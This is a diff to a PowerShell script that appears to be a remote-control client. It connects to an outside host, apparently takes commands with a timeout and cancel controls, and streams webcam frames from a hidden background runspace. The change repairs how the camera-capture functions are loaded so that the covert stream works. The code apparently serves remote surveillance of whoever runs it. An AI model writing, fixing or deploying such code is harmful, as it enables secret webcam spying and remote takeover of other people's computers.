@@ -2,7 +2,7 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "3.0.4"
+$Version = "3.0.5"
 $cfHost = "https://connect.aniketpandey.website"
 $maxRetries = 10
 $cmdTimeout = 300   # default timeout — use 'notimeout:' prefix or 'cancel' for manual control
@@ -1019,9 +1019,13 @@ function Connect-Cloudflare {
                         $script:cameraRunspace = $rs
                         $ps = [powershell]::Create()
                         $ps.Runspace = $rs
-                        # Define functions inline since runspaces don't inherit them
-                        $ps.AddScript((Get-Command Send-CameraFrame).ScriptBlock.ToString()) | Out-Null
-                        $ps.AddScript((Get-Command Start-CameraStream).ScriptBlock.ToString()) | Out-Null
+                        # Inject all required functions with proper 'function Name { body }' wrappers.
+                        # .ScriptBlock alone gives only the body — without the wrapper the function
+                        # is never defined as a named command in the runspace.
+                        $ps.AddScript("function Invoke-WinRTAsync { $((Get-Command Invoke-WinRTAsync).ScriptBlock) }") | Out-Null
+                        $ps.AddScript("function Read-RASBytes { $((Get-Command Read-RASBytes).ScriptBlock) }") | Out-Null
+                        $ps.AddScript("function Send-CameraFrame { $((Get-Command Send-CameraFrame).ScriptBlock) }") | Out-Null
+                        $ps.AddScript("function Start-CameraStream { $((Get-Command Start-CameraStream).ScriptBlock) }") | Out-Null
                         $ps.AddScript('Start-CameraStream -Quality 50') | Out-Null
                         $script:cameraTask = $ps
                         $script:cameraTask.BeginInvoke() | Out-Null
